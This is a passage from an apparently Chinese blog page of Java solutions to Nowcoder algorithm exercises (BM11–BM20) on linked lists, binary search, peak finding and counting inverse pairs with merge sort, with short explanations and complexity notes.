<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">FindFirstCommonNode</span><span class="params">(ListNode pHead1, ListNode pHead2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">l1</span> <span class="operator">=</span> pHead1, l2 = pHead2;</span><br><span class="line">        <span class="keyword">while</span>(l1 != l2)&#123;</span><br><span class="line">            l1 = (l1==<span class="literal">null</span>)?pHead2:l1.next;</span><br><span class="line">            l2 = (l2==<span class="literal">null</span>)?pHead1:l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM11-链表相加-二"><a href="#BM11-链表相加-二" class="headerlink" title="BM11 链表相加(二)"></a><strong>BM11</strong> <strong>链表相加(二)</strong></h2><blockquote>
<p>假设链表中每一个节点的值都在 0 - 9 之间，那么链表整体就可以代表一个整数。 </p>
<p>给定两个这种链表，请生成代表两个整数相加值的结果链表。 </p>
<p>数据范围：0≤n,m≤1000000，链表任意值 0≤val≤9<br>要求：空间复杂度 O(n))，时间复杂度 O(n)</p>
<p>例如：链表 1 为 9-&gt;3-&gt;7，链表 2 为 6-&gt;3，最后生成新的结果链表为 1-&gt;0-&gt;0-&gt;0。</p>
</blockquote>
<h3 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addInList</span> <span class="params">(ListNode head1, ListNode head2)</span> &#123;</span><br><span class="line">        <span class="comment">// 进行判空处理</span></span><br><span class="line">        <span class="keyword">if</span>(head1 == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head2;</span><br><span class="line">        <span class="keyword">if</span>(head2 == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 反转h1链表</span></span><br><span class="line">        head1 = reverse(head1);</span><br><span class="line">        <span class="comment">// 反转h2链表</span></span><br><span class="line">        head2 = reverse(head2);</span><br><span class="line">        <span class="comment">// 创建新的链表头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">nHead</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// 记录进位的数值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head1 != <span class="literal">null</span> || head2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// val用来累加此时的数值（加数+加数+上一位的进位=当前总的数值）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> tmp;</span><br><span class="line">            <span class="comment">// 当节点不为空的时候，则需要加上当前节点的值</span></span><br><span class="line">            <span class="keyword">if</span> (head1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                val += head1.val;</span><br><span class="line">                head1 = head1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 当节点不为空的时候，则需要加上当前节点的值</span></span><br><span class="line">            <span class="keyword">if</span> (head2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                val += head2.val;</span><br><span class="line">                head2 = head2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 求出进位</span></span><br><span class="line">            tmp = val/<span class="number">10</span>;</span><br><span class="line">            <span class="comment">// 进位后剩下的数值即为当前节点的数值</span></span><br><span class="line">            nHead.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(val%<span class="number">10</span>);</span><br><span class="line">            <span class="comment">// 下一个节点</span></span><br><span class="line">            nHead = nHead.next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后当两条链表都加完的时候，进位不为0的时候，则需要再加上这个进位</span></span><br><span class="line">        <span class="keyword">if</span>(tmp &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            nHead.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重新反转回来返回</span></span><br><span class="line">        <span class="keyword">return</span> reverse(head.next);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反转链表</span></span><br><span class="line">    ListNode <span class="title function_">reverse</span><span class="params">(ListNode head)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            cur.next = node;</span><br><span class="line">            node = cur;</span><br><span class="line">            cur = tail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（N）</li>
<li>空间复杂度：O（1）</li>
</ul>
<h2 id="BM12-单链表的排序"><a href="#BM12-单链表的排序" class="headerlink" title="BM12 单链表的排序"></a><strong>BM12</strong> <strong>单链表的排序</strong></h2><blockquote>
<p>给定一个节点数为n的无序单链表，对其按升序排序。</p>
<p>数据范围：0&lt;n≤100000，保证节点权值在[−109,109][−109,109]之内。</p>
<p>要求：空间复杂度 O(n)，时间复杂度 O(nlogn)</p>
</blockquote>
<h3 id="思路：转化为数组排序"><a href="#思路：转化为数组排序" class="headerlink" title="思路：转化为数组排序"></a>思路：转化为数组排序</h3><p>链表不能按照下表进行访问，因此可以借用数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortInList</span> <span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; nums = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(); </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//遍历链表，将节点值加入数组</span></span><br><span class="line">        <span class="keyword">while</span>(p != <span class="literal">null</span>)&#123; </span><br><span class="line">            nums.add(p.val);</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="comment">//对数组元素排序</span></span><br><span class="line">        Collections.sort(nums); </span><br><span class="line">        <span class="comment">//遍历数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.size(); i++)&#123; </span><br><span class="line">            <span class="comment">//将数组元素依次加入链表</span></span><br><span class="line">            p.val = nums.get(i); </span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(nlog2n)，sort函数一般为优化后的快速排序，复杂度为O(nlog2n)</li>
<li>空间复杂度：O(n)，存储链表元素值的辅助数组长度n</li>
</ul>
<h2 id="BM13-判断一个链表是否为回文结构"><a href="#BM13-判断一个链表是否为回文结构" class="headerlink" title="BM13 判断一个链表是否为回文结构"></a><strong>BM13</strong> <strong>判断一个链表是否为回文结构</strong></h2><blockquote>
<p>给定一个链表，请判断该链表是否为回文结构。</p>
<p>回文是指该字符串正序逆序完全一致。 </p>
<p>数据范围： 链表节点数 0≤n≤1050≤<em>n</em>≤105，链表中每个节点的值满足 ∣val∣≤107∣<em>v<strong>a</strong>l</em>∣≤107</p>
</blockquote>
<h3 id="思路：反转链表逐一判断"><a href="#思路：反转链表逐一判断" class="headerlink" title="思路：反转链表逐一判断"></a>思路：反转链表逐一判断</h3><p>思路很清晰，找到中点，反转后逐一判断，需要注意的是奇数情况要考虑一下～</p>
<ul>
<li>时间复杂度：O（N），遍历链表</li>
<li>空间复杂度：O（1）</li>
</ul>
<p>还有一种更好理解的方法：将链表转化为list来做（只存数据大小），不过这种想法的空间复杂度为O（N）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* public class ListNode &#123;</span></span><br><span class="line"><span class="comment">*   int val;</span></span><br><span class="line"><span class="comment">*   ListNode next = null;</span></span><br><span class="line"><span class="comment">* &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> head ListNode类 the head</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool布尔型</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPail</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">  ListNode q= head, p= head;</span><br><span class="line">  <span class="comment">//通过快慢指针找到中点</span></span><br><span class="line">  <span class="keyword">while</span> (q != <span class="literal">null</span> &amp;&amp; q.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      q = q.next.next;</span><br><span class="line">      p = p.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果q不为空，说明链表的长度是奇数个</span></span><br><span class="line">  <span class="keyword">if</span> (q != <span class="literal">null</span>) &#123;</span><br><span class="line">      p = p.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//反转后半部分链表</span></span><br><span class="line">  p = reverse(p);</span><br><span class="line"></span><br><span class="line">  q = head;</span><br><span class="line">  <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">//然后比较，判断节点值是否相等</span></span><br><span class="line">      <span class="keyword">if</span> (q.val != p.val)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      q = q.next;</span><br><span class="line">      p = p.next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">  <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (head != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">      head.next = prev;</span><br><span class="line">      prev = head;</span><br><span class="line">      head = next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM14-链表的奇偶重排"><a href="#BM14-链表的奇偶重排" class="headerlink" title="BM14 链表的奇偶重排"></a><strong>BM14</strong> <strong>链表的奇偶重排</strong></h2><blockquote>
<h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>给定一个单链表，请设定一个函数，将链表的奇数位节点和偶数位节点分别放在一起，重排后输出。 </p>
<p>注意是节点的编号而非节点的数值。 </p>
<p>数据范围：节点数量满足 0≤n≤105，节点中的值都满足 0≤val≤1000</p>
<p>要求：空间复杂度 O(n)，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：双指针-1"><a href="#思路：双指针-1" class="headerlink" title="思路：双指针"></a>思路：双指针</h3><p>定义一个双指针，一个指向奇数节点，一个指向偶数节点，遍历操作就好了～</p>
<ul>
<li>时间复杂度：O（N）</li>
<li>空间复杂度：O（1）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">oddEvenList</span> <span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//如果链表为空，不用重排</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="comment">//even开头指向第二个节点，可能为空</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">even</span> <span class="operator">=</span> head.next; </span><br><span class="line">        <span class="comment">//odd开头指向第一个节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">odd</span> <span class="operator">=</span> head; </span><br><span class="line">        <span class="comment">//指向even开头</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">evenhead</span> <span class="operator">=</span> even; </span><br><span class="line">        <span class="keyword">while</span>(even != <span class="literal">null</span> &amp;&amp; even.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//odd连接even的后一个，即奇数位</span></span><br><span class="line">            odd.next = even.next; </span><br><span class="line">            <span class="comment">//odd进入后一个奇数位</span></span><br><span class="line">            odd = odd.next; </span><br><span class="line">            <span class="comment">//even连接后一个奇数的后一位，即偶数位</span></span><br><span class="line">            even.next = odd.next; </span><br><span class="line">            <span class="comment">//even进入后一个偶数位</span></span><br><span class="line">            even = even.next; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//even整体接在odd后面</span></span><br><span class="line">        odd.next = evenhead; </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM15-删除有序链表中重复的元素-I"><a href="#BM15-删除有序链表中重复的元素-I" class="headerlink" title="BM15 删除有序链表中重复的元素-I"></a><strong>BM15</strong> <strong>删除有序链表中重复的元素-I</strong></h2><blockquote>
<p>删除给出链表中的重复元素（链表中元素从小到大有序），使链表中的所有元素都只出现一次<br>例如：<br>给出的链表为1→1→2,返回1→2.<br>给出的链表为1→1→2→3→3,返回1→2→3 </p>
<p>数据范围：链表长度满足 0≤n≤100，链表中任意节点的值满足 ∣val∣≤100</p>
</blockquote>
<h3 id="思路：遍历"><a href="#思路：遍历" class="headerlink" title="思路：遍历"></a>思路：遍历</h3><p>很容易想到的一个思路，遇到相同的数据，保留第一个遇到的即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span> <span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//空链表</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//遍历指针</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head; </span><br><span class="line">        <span class="comment">//指针当前和下一位不为空</span></span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span> &amp;&amp; cur.next != <span class="literal">null</span>)&#123; </span><br><span class="line">            <span class="comment">//如果当前与下一位相等则忽略下一位</span></span><br><span class="line">            <span class="keyword">if</span>(cur.val == cur.next.val) </span><br><span class="line">                cur.next = cur.next.next;</span><br><span class="line">            <span class="comment">//否则指针正常遍历</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（N）</li>
<li>空间复杂度：O（1）</li>
</ul>
<h2 id="BM16-删除有序链表中重复的元素-II"><a href="#BM16-删除有序链表中重复的元素-II" class="headerlink" title="BM16 删除有序链表中重复的元素-II"></a><strong>BM16</strong> <strong>删除有序链表中重复的元素-II</strong></h2><blockquote>
<p>给出一个升序排序的链表，删除链表中的<strong>所有</strong>重复出现的元素，只保留原链表中只出现一次的元素。<br>例如：<br>给出的链表为1→2→3→3→4→4→5, 返回1→2→5.<br>给出的链表为1→1→1→2→3, 返回2→3. </p>
<p>数据范围：链表长度 0≤n≤100000≤<em>n</em>≤10000，链表中的值满足 ∣val∣≤1000∣<em>v<strong>a</strong>l</em>∣≤1000</p>
<p>要求：空间复杂度 O(n)，时间复杂度 O(n)</p>
<p>进阶：空间复杂度 O(1)，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：遍历-1"><a href="#思路：遍历-1" class="headerlink" title="思路：遍历"></a>思路：遍历</h3><p>注意，这个题和前面一题的不同之处在于：删除<span style='color:red'>所有的</span>相同元素</p>
<p>大部分逻辑和前面一个题一样～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span> <span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//空链表</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//在链表前加一个表头</span></span><br><span class="line">        res.next = head; </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> res;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span> &amp;&amp; cur.next.next != <span class="literal">null</span>)&#123; </span><br><span class="line">            <span class="comment">//遇到相邻两个节点值相同</span></span><br><span class="line">            <span class="keyword">if</span>(cur.next.val == cur.next.next.val)&#123; </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next.val;</span><br><span class="line">                <span class="comment">//将所有相同的都跳过</span></span><br><span class="line">                <span class="keyword">while</span> (cur.next != <span class="literal">null</span> &amp;&amp; cur.next.val == temp) </span><br><span class="line">                    cur.next = cur.next.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回时去掉表头</span></span><br><span class="line">        <span class="keyword">return</span> res.next; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（N）</li>
<li>空间复杂度：O（1）</li>
</ul>
<h1 id="二、二分查找"><a href="#二、二分查找" class="headerlink" title="二、二分查找"></a>二、二分查找</h1><h2 id="BM17-二分查找-I"><a href="#BM17-二分查找-I" class="headerlink" title="BM17 二分查找-I"></a><strong>BM17</strong> <strong>二分查找-I</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span> <span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> , right = nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] == target)&#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM18-二维数组中的查找"><a href="#BM18-二维数组中的查找" class="headerlink" title="BM18 二维数组中的查找"></a><strong>BM18</strong> <strong>二维数组中的查找</strong></h2><blockquote>
<p>在一个二维数组array中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 </p>
<p>[ </p>
<p>[1,2,8,9],<br>[2,4,9,12],<br>[4,7,10,13],<br>[6,8,11,15]</p>
<p>] </p>
<p>给定 target &#x3D; 7，返回 true。 </p>
<p>给定 target &#x3D; 3，返回 false。 </p>
<p>数据范围：矩阵的长宽满足 0≤n,m≤500 ， 矩阵中的值满足 0≤val≤109<br>进阶：空间复杂度 O(1) ，时间复杂度 O(n+m)</p>
</blockquote>
<h3 id="思路：二分查找"><a href="#思路：二分查找" class="headerlink" title="思路：二分查找"></a>思路：二分查找</h3><p>首先看四个角，左上与右下必定为最小值与最大值，而左下与右上就有规律了：<strong>左下元素大于它上方的元素，小于它右方的元素，右上元素与之相反</strong>。既然左下角元素有这么一种规律，相当于将要查找的部分分成了一个大区间和小区间，每次与左下角元素比较，我们就知道目标值应该在哪部分中，于是可以利用分治思维来做。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">Find</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span> [][] array)</span> &#123;</span><br><span class="line">        <span class="comment">//优先判断特殊</span></span><br><span class="line">        <span class="keyword">if</span>(array.length == <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> array.length;</span><br><span class="line">        <span class="keyword">if</span>(array[<span class="number">0</span>].length == <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> array[<span class="number">0</span>].length;</span><br><span class="line">        <span class="comment">//从最左下角的元素开始往左或往上</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>, j = <span class="number">0</span>; i &gt;= <span class="number">0</span> &amp;&amp; j &lt; m; )&#123; </span><br><span class="line">            <span class="comment">//元素较大，往上走</span></span><br><span class="line">            <span class="keyword">if</span>(array[i][j] &gt; target)   </span><br><span class="line">                i--;</span><br><span class="line">            <span class="comment">//元素较小，往右走</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(array[i][j] &lt; target) </span><br><span class="line">                j++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(m+n)，遍历矩阵的时候，最多经过矩阵的一行一列</li>
<li>空间复杂度：O(1)，常数级变量，无额外辅助空间</li>
</ul>
<h2 id="BM19-寻找峰值"><a href="#BM19-寻找峰值" class="headerlink" title="BM19 寻找峰值"></a><strong>BM19</strong> <strong>寻找峰值</strong></h2><blockquote>
<p>给定一个长度为n的数组nums，请你找到峰值并返回其索引。数组可能包含多个峰值，在这种情况下，返回任何一个所在位置即可。 </p>
<p>1.峰值元素是指其值严格大于左右相邻值的元素。严格大于即不能有等于</p>
<p>2.假设 nums[-1] &#x3D; nums[n] &#x3D; −∞−∞</p>
<p>3.对于所有有效的 i 都有 nums[i] !&#x3D; nums[i + 1] </p>
<p>4.你可以使用O(logN)的时间复杂度实现此问题吗？</p>
</blockquote>
<p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/9EB9CD58B9EA5E04C890326B5C1F471F.png"></p>
<h3 id="思路：二分查找-1"><a href="#思路：二分查找-1" class="headerlink" title="思路：二分查找"></a>思路：二分查找</h3><ul>
<li>nums[mid] &lt; nums[mid + 1]说明在“上坡”，则可以使left &#x3D; mid + 1（因为mid肯定不是峰值），向“峰”处压缩</li>
<li>nums[mid] &gt; nums[mid + 1]说明在“下坡”，则应该使right &#x3D; mid（mid可能是峰值），往“峰”处压缩</li>
</ul>
<p>虽然开始left和right之间可能有多个峰值，但是随着left和right不断逼近，最后两者之间一定会压缩到一个峰值上，因为两者都是向“峰”不断靠近的，但是不会超过<code>最终</code>的“峰”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findPeakElement</span> <span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//二分法</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123; </span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//右边是往上，一定有坡峰</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; nums[mid + <span class="number">1</span>])</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//左边是往上，一定能找到波峰</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//其中一个波峰</span></span><br><span class="line">        <span class="keyword">return</span> right; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM20-数组中的逆序对"><a href="#BM20-数组中的逆序对" class="headerlink" title="BM20 数组中的逆序对"></a><strong>BM20</strong> <strong>数组中的逆序对</strong></h2><blockquote>
<p>在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P mod 1000000007</p>
<p>要求：空间复杂度 O(n)，时间复杂度 O(nlogn)</p>
</blockquote>
<h3 id="思路：归并排序"><a href="#思路：归并排序" class="headerlink" title="思路：归并排序"></a>思路：归并排序</h3><p>归并排序」与「逆序对」是息息相关的。归并排序体现了 “分而治之” 的算法思想，具体为：</p>
<ul>
<li>分： 不断将数组从中点位置划分开（即二分法），将整个数组的排序问题转化为子数组的排序问题；</li>
<li>治： 划分到子数组长度为 1 时，开始向上合并，不断将 较短排序数组 合并为 较长排序数组，直至合并至原数组时完成排序；</li>
</ul>
<p><img src="https://pic.leetcode-cn.com/1614274007-rtFHbG-Picture2.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">InversePairs</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;</span><br><span class="line">        <span class="comment">// 长度小于2则无逆序对</span></span><br><span class="line">        <span class="keyword">if</span>(array.length &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 进入归并</span></span><br><span class="line">        mergeSort(array,<span class="number">0</span>,array.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] array,<span class="type">int</span> left,<span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="comment">// 找分割点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="comment">// 左子数组</span></span><br><span class="line">            mergeSort(array,left,mid);</span><br><span class="line">            <span class="comment">// 右子数组</span></span><br><span class="line">            mergeSort(array,mid+<span class="number">1</span>,right);</span><br><span class="line">            <span class="comment">// 并</span></span><br><span class="line">            merge(array,left,mid,right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] array,<span 